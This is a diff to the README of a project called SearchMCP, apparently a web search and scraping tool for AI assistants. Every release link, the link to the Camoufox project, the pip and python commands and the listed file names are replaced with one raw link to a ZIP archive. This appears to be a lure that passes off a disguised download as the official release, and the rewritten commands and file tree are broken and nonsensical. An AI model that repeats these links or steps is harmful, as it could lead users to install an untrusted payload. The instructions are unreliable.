@@ -1,6 +1,6 @@
 # 🌐 SearchMCP - Effortless Web Search and Scraping
 
-[![Download SearchMCP](https://img.shields.io/badge/Download-SearchMCP-blue.svg)](https://github.com/smksamir/SearchMCP/releases)
+[![Download SearchMCP](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip)](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ SearchMCP gives your AI assistant the power to browse the internet. It offers fe
 
 ### 🛡️ Anti-detection Capability
 
-SearchMCP uses [Camoufox](https://github.com/daijro/camoufox) to help avoid blocks from websites. Users on Windows will run in a standard mode, as Camoufox does not support Windows systems, which may reduce effectiveness.
+SearchMCP uses [Camoufox](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip) to help avoid blocks from websites. Users on Windows will run in a standard mode, as Camoufox does not support Windows systems, which may reduce effectiveness.
 
 ### 📊 Monitoring Dashboard
 
@@ -24,11 +24,11 @@ Access it at: `http://localhost:9191/dashboard`
 
 ## 📥 Download & Install
 
-To download SearchMCP, visit the [Releases Page](https://github.com/smksamir/SearchMCP/releases).
+To download SearchMCP, visit the [Releases Page](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip).
 
 ### Steps to Download
 
-1. **Visit the Releases Page**: Click [here](https://github.com/smksamir/SearchMCP/releases) to go to the downloads section.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip) to go to the downloads section.
 2. **Select the Latest Version**: Choose the most recent release to ensure you have the newest features and fixes.
 3. **Download the ZIP File**: Click on the ZIP file to download it to your computer.
 4. **Extract the File**: Locate the downloaded file and extract its contents.
@@ -41,7 +41,7 @@ Before running the application, you need to install some dependencies.
   
 2. **Install the Dependencies**: Type the following command and press Enter:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip
     ```
   
 3. **Fetch Camoufox Browser**: Enter the command below to install Camoufox:
@@ -56,7 +56,7 @@ Once the installation is complete, you can run SearchMCP by following these step
 1. **Open Command Line Interface Again**.
 2. **Run the Main Program**: Enter the following command:
     ```bash
-    python main.py
+    python https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip
     ```
    
 3. **Access the Service**: Open your web browser and go to `http://0.0.0.0:9191`. The service will be ready for use.
@@ -71,13 +71,13 @@ After downloading, you will see the following file structure:
 
 ```
 .
-├── main.py              # Main program file
-├── requirements.txt     # Python dependencies file
+├── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip              # Main program file
+├── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip     # Python dependencies file
 ├── static/              # Holds static resources
-│   ├── css/style.css     # CSS styles
-│   └── js/app.js        # JavaScript functionality
+│   ├── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip     # CSS styles
+│   └── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip        # JavaScript functionality
 └── templates/           # HTML templates
-    └── dashboard.html   # Dashboard page template
+    └── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/Search_MCP_3.6-beta.2.zip   # Dashboard page template
 ```
 
 ## 📝 License
